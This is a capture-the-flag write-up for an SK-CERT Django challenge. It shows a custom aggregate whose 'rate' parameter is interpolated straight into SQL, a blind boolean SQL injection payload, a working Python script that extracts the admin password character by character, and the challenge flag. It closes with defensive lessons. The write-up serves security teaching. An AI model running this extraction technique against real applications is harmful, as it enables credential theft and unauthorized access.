# ORMT Challenge 3

================================================================
WRITEUP: ORMT Challenge 3 (SK-CERT CTF)
Flag: SK-CERT{4ggr3g4t3_r4t3_t3mpl4t3_sqli}
================================================================

CHALLENGE OVERVIEW
------------------
A Django bookstore application with a new "book repository" feature offering
advanced filtering and aggregation. The admin area at /admin is protected by
HTTP Basic Auth and displays the flag on successful authentication.

Previous vulnerabilities (ORM parameter injection, CVE-2025-64459) have been
fixed. The new attack surface is the /repository endpoint.

Admin username is fixed in the seed: 'Admin'
Admin password: randomly generated 32-char alphanumeric string


THE VULNERABLE CODE
-------------------
# functions.py
class Convert(Aggregate):
    function = "SUM"
    template = "%(function)s(%(expressions)s) * %(rate)s"   # <-- Python % template
    arity = 1

    def __init__(self, expression, rate=None, **extra):
        extra.setdefault("rate", self.default_rate if rate is None else rate)
        super().__init__(expression, **extra)   # rate ends up in self.extra

# views.py
AGGREGATES = {'Min': Min, 'Max': Max, 'Avg': Avg, 'Count': Count, 'Sum': Sum, 'Convert': Convert}
VALID_FIELDS = [f.name for f in Book._meta.get_fields() if isinstance(f, Field) and not f.is_relation]

def book_filtering(request):
    ...
    for param in request.GET:
        if param.find('__') != -1:
            ...
            filters[param] = request.GET[param]
        else:
            if param in ['template', 'function']:      # blocked
                return HttpResponseBadRequest("Forbidden param")
            params[param] = request.GET[param]

    aggregate_function = params.pop('aggregate')
    target_field = params.pop('field')
    ...
    aggregate_function_callable = AGGREGATES[aggregate_function]
    result = Book.objects.filter(**filters).aggregate(
        res=aggregate_function_callable(target_field, **params)   # params passed here!
    )


THE VULNERABILITY
-----------------
Django's Aggregate.as_sql() renders the SQL using Python's % string operator:

    sql = self.extra.get('template', self.template) % {
        'function': self.function,
        'expressions': ...,
        **self.extra,          # includes all user-supplied kwargs
    }

The Convert template is:
    "%(function)s(%(expressions)s) * %(rate)s"

The 'rate' value is substituted by Python's % operator DIRECTLY into the SQL
string — it is NOT passed as a parameterized SQL argument. This means any
value supplied for 'rate' lands verbatim in the executed SQL query.

The view blocks 'template' and 'function' as GET parameter names (correctly),
but 'rate' is allowed and flows straight into SQL.


THE EXPLOIT
-----------
Blind boolean oracle via SQLite CASE expression injected into 'rate':

GET /repository?aggregate=Convert&field=price&rate=<PAYLOAD>

Payload to test if password[N] == 'X':
  (SELECT CASE WHEN substr(password,N,1)='X' THEN 1 ELSE 0 END
   FROM main_siteuser WHERE role='admin')

Generated SQL:
  SELECT SUM("main_book"."price") *
         (SELECT CASE WHEN substr(password,N,1)='X' THEN 1 ELSE 0 END
          FROM main_siteuser WHERE role='admin')
  AS "res" FROM "main_book"

Oracle signal (from HTML response):
  <span class="agg-value">134.98...</span>   →  non-zero  →  char matches
  (no agg-value span / value is 0)           →  zero      →  char doesn't match

Extraction loop:
  - Check password length using length() subquery (~32 requests)
  - For each position 1..32, iterate a-zA-Z0-9 until oracle fires
  - Worst case: 32 × 62 = 1984 requests; average ~32 × 31 ≈ 992 requests

Once password is extracted:
  GET /admin
  Authorization: Basic Base64("Admin:<extracted_password>")
  → HTTP 200 with flag


EXPLOIT SCRIPT (CONDENSED)
---------------------------
import requests, re, base64, string

TARGET = "http://exp.cybergame.sk:7003"
CHARS = string.ascii_letters + string.digits

def oracle(pos, char):
    rate = (f"(SELECT CASE WHEN substr(password,{pos},1)='{char}'"
            f" THEN 1 ELSE 0 END FROM main_siteuser WHERE role='admin')")
    r = requests.get(f"{TARGET}/repository",
                     params={"aggregate": "Convert", "field": "price", "rate": rate})
    m = re.search(r'agg-value">(.*?)</span>', r.text)
    return m and float(m.group(1)) != 0.0

password = []
for pos in range(1, 33):
    for char in CHARS:
        if oracle(pos, char):
            password.append(char)
            break

pw = ''.join(password)
creds = base64.b64encode(f"Admin:{pw}".encode()).decode()
r = requests.get(f"{TARGET}/admin", headers={"Authorization": f"Basic {creds}"})
print(r.text)  # flag


LESSONS LEARNED
---------------
1. Custom Django Aggregate classes that use Python's % string formatting for
   SQL templates create SQL injection vulnerabilities if any template variable
   is user-controlled. Django's own built-in aggregates avoid this by using
   parameterized expressions, but custom ones must be written carefully.

2. Blocking specific dangerous parameter names ('template', 'function') is
   insufficient if other template variables ('rate') are also injectable.
   The correct fix is to treat all user-supplied values as SQL parameters,
   not interpolate them into the query string.

3. Even with a blind oracle (only boolean signal), a 32-char alphanumeric
   password can be extracted in under 2000 HTTP requests — fully practical
   for a CTF and for real attacks.

4. Fixing ORM parameter injection (ORMT1/ORMT2) while introducing a new
   custom aggregate with template injection is a classic "whack-a-mole"
   security anti-pattern: patching one class of vulnerability while
   accidentally introducing another.

================================================================
